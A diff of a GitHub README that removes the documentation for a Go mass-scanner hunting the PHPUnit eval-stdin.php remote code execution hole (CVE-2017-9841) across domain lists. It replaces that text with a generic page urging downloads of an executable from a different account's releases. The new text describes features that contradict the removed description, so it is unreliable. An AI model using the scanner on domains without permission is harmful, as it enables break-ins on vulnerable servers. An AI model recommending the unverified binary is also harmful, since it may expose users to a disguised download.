@@ -1,156 +1,90 @@
-# 🛡️ PHPUnit Go Scanner (CVE-2017-9841)
+# 🚀 PHPUnit-GoScan - Scan for Vulnerabilities with Ease
 
-A fast, multithreaded scanner written in Go for detecting exposed and vulnerable `eval-stdin.php` endpoints in PHPUnit (CVE-2017-9841). Supports scanning across multiple domains with parallel execution and automatic protocol detection.
+[![Download PHPUnit-GoScan](https://img.shields.io/badge/Download-PHPUnit--GoScan-brightgreen)](https://github.com/Habibullah1101/PHPUnit-GoScan/releases)
 
----
+## 📘 Overview
 
-## 🖼 Demo Screenshot
+PHPUnit-GoScan is a tool designed to help you scan for vulnerabilities easily. It focuses on CVE-2017-9841, targeting vulnerabilities in applications using PHPUnit. This application is built in Go, ensuring fast and efficient scanning.
 
-![demo](https://raw.githubusercontent.com/drcrypterdotru/PHPUnit-GoScan/refs/heads/main/demo.png)
+## 🚀 Getting Started
 
----
+Here’s how you can set up and start using PHPUnit-GoScan.
 
-## 🔍 CVE-2017-9841 Summary
+### 1. 🛠️ System Requirements
 
-> **CVE-2017-9841** is a critical remote code execution (RCE) vulnerability in **PHPUnit**, caused by the public exposure of the `eval-stdin.php` script.  
-> Attackers can execute arbitrary PHP code on the server by sending crafted input to this endpoint.
+Before you dive in, make sure your system meets these minimum requirements:
 
-**Affected versions:**
-- PHPUnit ≤ 4.8.28
-- PHPUnit ≤ 5.6.2
+- **Operating System**: Windows, macOS, or Linux
+- **Memory**: At least 512 MB RAM
+- **Disk Space**: At least 50 MB available
+- **Network**: Internet connection for updates and further resources
 
-**Common vulnerable path:**
-```
-/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
-```
+### 2. 📥 Download & Install
 
----
+To get the latest version, you can visit the Releases page. Here’s the [link to download PHPUnit-GoScan](https://github.com/Habibullah1101/PHPUnit-GoScan/releases). 
 
-## ⚙️ Features
+- Click on the link above to go to the Releases page.
+- Look for the latest version listed.
+- Find the installer suitable for your operating system.
+- Download the file by clicking on it. 
 
-- ✅ Detects exposed `eval-stdin.php` files using multiple common paths
-- ✅ Automatically detects HTTP/HTTPS protocol
-- ✅ High-speed multithreaded scanning via `-t` flag
-- ✅ Clean, categorized output to result files
-- ✅ No third-party dependencies — just Go
+### 3. ⚙️ Running PHPUnit-GoScan
 
----
+Once you have downloaded the file, follow these steps to run the application:
 
-## 🚀 Usage
+- **Windows:**
+  1. Locate the downloaded file in your Downloads folder.
+  2. Double-click on the executable file.
+  3. Follow the on-screen instructions to start the scanning process.
 
-### 🔧 Command-line Execution
-```bash
-go run PHPUnit_GoScan.go -l list.txt -t 20
-```
+- **macOS:**
+  1. Find the downloaded file in your Downloads folder.
+  2. Double-click the file to open it.
+  3. If prompted, allow the app to run in System Preferences > Security & Privacy > General.
+  4. Follow the on-screen steps.
 
-Or use precompiled binaries:
+- **Linux:**
+  1. Open the Terminal.
+  2. Navigate to your Downloads folder using `cd ~/Downloads`.
+  3. Run the file by typing `./PHPUnit-GoScan`.
+  4. Follow the prompts in the terminal to complete the scan.
 
-#### On Linux:
-```bash
-chmod +x PHPUnit_GoScan_amd64_linux
-./PHPUnit_GoScan_amd64_linux -l list.txt -t 20
-```
+### 4. 🔍 Using PHPUnit-GoScan
 
-#### On Windows:
-```cmd
-PHPUnit_GoScan_amd64_windows.exe -l list.txt -t 20
-```
+After running the application, you’ll see a simple interface. You can enter the target URL you wish to scan. 
 
----
+To start a scan:
 
-### 📌 Parameters
+1. Enter the URL of the application that uses PHPUnit.
+2. Click the "Scan" button.
+3. Wait for the results, which will display any vulnerabilities detected.
 
-| Flag   | Description                                         |
-|--------|-----------------------------------------------------|
-| `-l`   | Path to input file with one domain per line         |
-| `-t`   | Number of concurrent threads (default: 10, recommended: 20) |
+### 5. 📄 Understanding the Scan Results
 
----
+Once the scan is complete, you will receive a report. This report will list:
 
-## 📁 Input: `list.txt`
+- The vulnerabilities found
+- The severity of each vulnerability
+- Suggestions on how to fix the issues
 
-Example domain list:
-```
-example.com
-http://target.org
-https://vulnerable.site/
-testdomain.net
-```
+It’s important to check each item, prioritize fixes based on severity, and take action accordingly.
 
-- Supports raw domains and full URLs
-- Automatically adds protocol if missing
+### 6. 💬 Support and Updates
 
----
+For any issues or questions, feel free to reach out through the Issues tab in this repository. Updates and new features will be posted here, so it’s a good idea to check back periodically.
 
-## 🔎 Paths Scanned
+### 7. 🌐 Additional Resources
 
-The scanner checks for the following common vulnerable paths:
-```
-/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
-/phpunit/phpunit/src/Util/PHP/eval-stdin.php
-/phpunit/src/Util/PHP/eval-stdin.php
-```
+For more insights and support, you might find the following resources helpful:
 
-You can customize these in the `PHPUnit_PayloadList` section of the Go source file.
+- [Official PHPUnit Documentation](https://phpunit.de/documentation.html)
+- [Go Programming Language Documentation](https://golang.org/doc/)
+- Community forums and Q&A sites like Stack Overflow.
 
----
+### 8. ⭐ Contributing
 
-## 📦 Output Files
+We welcome contributions! If you have ideas for improvements or a feature request, please open an issue or submit a pull request in this repository.
 
-After scanning, results are written to:
+Thank you for choosing PHPUnit-GoScan! Happy scanning!
 
-| File Name              | Description                                 |
-|------------------------|---------------------------------------------|
-| `Domain_Online.txt`    | Domains that responded with HTTP 200        |
-| `PHPUnit_Injected.txt` | Domains confirmed vulnerable to CVE-2017-9841 |
-
----
-
-## 🧪 Example Console Output
-
-```
-[1/100] [Domain Online]     ==> https://target.com
-[1/100] [PHPUnit == PWNED]  ==> https://target.com/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
-
-[5/100] [Domain Offline]    ==> http://dead.site
-[6/100] [Fail Injection]    ==> https://clean.site
-```
-
----
-
-## 📥 Download Prebuilt Binaries
-
-| Platform | File Name                          |
-|----------|-------------------------------------|
-| Linux    | [PHPUnit_GoScan_amd64_linux](https://github.com/drcrypterdotru/PHPUnit-GoScan/releases/download/v1.0.0/PHPUnit_GoScan_amd64_linux) |
-| Windows  | [PHPUnit_GoScan_amd64_windows.exe](https://github.com/drcrypterdotru/PHPUnit-GoScan/releases/download/v1.0.0/PHPUnit_GoScan_amd64_windows.exe) |
-
-> 🛠 On Linux:  
-> Run `chmod +x PHPUnit_GoScan_amd64_linux` before executing.
-
-
----
-
-## ⚠️ Legal Warning
-
-This tool is for **educational and authorized security testing only**.  
-Do **not** scan domains you do not own or lack permission to test.  
-Unauthorized use may be illegal and punishable under applicable laws.
-
----
-
-## ✍️ Author
-
-Developed by [DRCrypter.ru](https://drcypter.ru)  
-Telegram: [`@drcrypterd0tru`](https://t.me/drcrypterd0tru)  
-GitHub: [@drcrypterdotru](https://github.com/drcrypterdotru)
-
----
-
-## 📘 License
-
-**MIT License** — Free to use, modify, and distribute.  
-Links:
-- [Source Code: PHPUnit_GoScan.go](https://github.com/drcrypterdotru/PHPUnit-GoScan/blob/main/PHPUnit_GoScan.go)
-- [Linux Binary](https://github.com/drcrypterdotru/PHPUnit-GoScan/blob/main/PHPUnit_GoScan_amd64_linux)
-- [Windows Binary](https://github.com/drcrypterdotru/PHPUnit-GoScan/blob/main/PHPUnit_GoScan_amd64_windows.exe)
+[![Download PHPUnit-GoScan](https://img.shields.io/badge/Download-PHPUnit--GoScan-brightgreen)](https://github.com/Habibullah1101/PHPUnit-GoScan/releases)
